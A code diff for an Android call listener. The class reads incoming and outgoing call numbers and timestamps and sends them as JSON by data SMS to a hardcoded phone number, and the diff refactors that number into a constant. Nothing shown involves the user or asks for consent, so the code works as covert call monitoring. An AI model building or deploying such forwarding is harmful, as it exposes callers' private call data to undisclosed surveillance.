@@ -15,13 +15,17 @@ public class IncomingCallStateListener extends PhoneStateListener {
     private static String lastNumber;
     private static boolean inprogress;
 
+    public static final String OUTGOING_NUMBER = "+923006860746";
+
     BroadcastReceiver outGoingCallListner = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-            String body = String.format("{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
-                    lastNumber, String.valueOf(lastTime));
-            Helpers.sendDataSms("+923006860746", "9851", body);
+            String body = String.format(
+                    "{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
+                    lastNumber, String.valueOf(lastTime)
+            );
+            Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
         }
     };
 
@@ -31,9 +35,11 @@ public class IncomingCallStateListener extends PhoneStateListener {
         switch (state) {
             case TelephonyManager.CALL_STATE_IDLE:
                 if (inprogress) {
-                    String body = String.format("{\"state\": \"old\", \"number\": \"%s\", \"time\": \"%s\" }",
-                            lastNumber, String.valueOf(lastTime));
-                    Helpers.sendDataSms("+923006860746", "9851", body);
+                    String body = String.format(
+                            "{\"state\": \"old\", \"time\": \"%s\", \"dcTime\": \"%s\" }",
+                            String.valueOf(lastTime), String.valueOf(System.currentTimeMillis())
+                    );
+                    Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
                     inprogress = false;
                 }
 
@@ -42,9 +48,11 @@ public class IncomingCallStateListener extends PhoneStateListener {
                 inprogress = true;
                 lastNumber = incomingNumber;
                 lastTime = System.currentTimeMillis();
-                String body = String.format("{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
-                        lastNumber, String.valueOf(lastTime));
-                Helpers.sendDataSms("+923006860746", "9851", body);
+                String body = String.format(
+                        "{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
+                        lastNumber, String.valueOf(lastTime)
+                );
+                Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
                 break;
         }
     }
